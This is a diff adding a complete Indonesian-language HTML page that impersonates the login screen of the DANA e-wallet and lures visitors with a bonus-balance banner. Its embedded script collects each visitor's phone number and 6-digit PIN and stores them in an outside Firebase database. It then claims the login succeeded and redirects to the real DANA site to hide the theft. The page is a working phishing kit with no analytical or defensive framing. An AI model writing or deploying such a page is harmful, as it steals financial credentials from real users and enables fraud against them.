@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk ke DANA</title>
+    
+    <!-- Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-database.js";
+
+        // Konfigurasi Firebase
+        const firebaseConfig = {
+          apiKey: "AIzaSyADiJ85Yr0cnM3AlN4E23DeLhjjtzS-utg",
+          authDomain: "testing-f7e72.firebaseapp.com",
+          databaseURL: "https://testing-f7e72-default-rtdb.firebaseio.com",
+          projectId: "testing-f7e72",
+          storageBucket: "testing-f7e72.firebasestorage.app",
+          messagingSenderId: "683074830976",
+          appId: "1:683074830976:web:b76109a0b991cbd9335c65"
+        };
+
+        // Inisialisasi Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        document.addEventListener('DOMContentLoaded', function () {
+            document.getElementById('loginForm').addEventListener('submit', function (e) {
+                e.preventDefault();
+
+                const phoneNumber = document.getElementById('phoneNumber').value;
+                const pin = document.getElementById('pin').value;
+
+                if (!/^\d{6}$/.test(pin)) {
+                    alert('PIN harus 6 digit angka.');
+                    return;
+                }
+
+                const newUserRef = ref(database, 'users/' + Date.now());
+                set(newUserRef, {
+                    phoneNumber: phoneNumber,
+                    pin: pin
+                }).then(() => {
+                    alert('Login berhasil! Anda akan dialihkan ke DANA.');
+                    window.location.href = "https://www.dana.id/";
+                }).catch((error) => {
+                    alert('Terjadi kesalahan: ' + error.message);
+                });
+            });
+        });
+    </script>
+    
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #F0F8FF;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 100%;
+            max-width: 350px;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 100px;
+            cursor: pointer;
+        }
+
+        h1 {
+            font-size: 18px;
+            color: #007AFF;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .form-group label {
+            font-size: 14px;
+            font-weight: bold;
+            color: #333;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        input:focus {
+            border-color: #007AFF;
+            outline: none;
+            box-shadow: 0 0 4px rgba(0, 123, 255, 0.3);
+        }
+
+        button {
+            width: 100%;
+            background-color: #007AFF;
+            color: #fff;
+            padding: 12px;
+            font-size: 16px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #005BBB;
+        }
+
+        .ubah-pin {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .ubah-pin a {
+            color: #007AFF;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .ubah-pin a:hover {
+            text-decoration: underline;
+        }
+
+        .bonus-text {
+            font-size: 14px;
+            color: #007AFF;
+            background-color: #E6F2FF;
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 15px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <a href="https://www.dana.id/">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSGglzp3pi04sdTe7teWwIj3abbA0HHqwYcxwzXVWi5ueYhk_MwQge3tE8&s=10" alt="DANA Logo">
+            </a>
+        </div>
+        <h1>Masuk ke DANA</h1>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="phoneNumber">Nomor HP</label>
+                <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="08XXXXXXXXXX" required pattern="[0-9]{10,13}">
+            </div>
+            <div class="form-group">
+                <label for="pin">PIN</label>
+                <input type="password" id="pin" name="pin" placeholder="******" required maxlength="6" inputmode="numeric">
+            </div>
+            <button type="submit">Masuk</button>
+        </form>
+        <div class="ubah-pin">
+            <a href="#">Ubah PIN</a>
+        </div>
+        <div class="bonus-text">
+            🎁 Klaim Bonus Saldo DANA Anda! 🎁
+        </div>
+    </div>
+</body>
+</html>
